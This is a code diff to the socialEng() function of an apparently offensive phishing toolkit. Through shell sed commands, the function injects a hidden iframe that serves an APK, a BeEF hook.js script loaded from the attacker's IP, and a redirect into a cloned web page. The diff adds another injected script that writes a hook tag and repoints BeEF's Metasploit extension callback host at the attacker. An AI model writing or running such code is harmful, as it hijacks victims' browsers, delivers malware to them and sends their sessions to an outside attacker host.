@@ -522,6 +522,9 @@ def socialEng():
                     'sed -i \'s#</body>#<iframe id="frame" src="' + MAM + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + IP + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + IP_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html'
                     , shell=True)
                 subprocess.call(
+                    'sed -i \'s#</body>#<script>\n  var commandModuleStr = \'<script src="\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>" type="text/javascript"><\/script>;\n  document.write(commandModuleStr);\\n\'</script>;</body>#g\' /var/www/html/index.html'
+                    , shell=True)
+                subprocess.call(
                     'sed -i -e \'s/\/root\///g\' /var/www/html/index.html'
                     , shell=True)
                 f = open(metdod, "r")
@@ -758,8 +761,8 @@ def socialEng():
                 'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
                 , shell=True)
             subprocess.call(
-                'sed -i \'18s/.*/            host: "' + VLAN + '"/\' /usr/share/beef-xss/config.yaml && '
-                'sed -i \'28s/.*/            callback_host: "' + VLAN + '"/\' /usr/share/beef-xss/config.yaml'
+                'sed -i \'18s/.*/            host: "' + VLAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
+                'sed -i \'28s/.*/            callback_host: "' + VLAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
                 , shell=True)
             execut = '#!/bin/bash\n/usr/share/ngrok/ngrok "$@"'
             commandl = open('/usr/bin/ngrok', 'w')
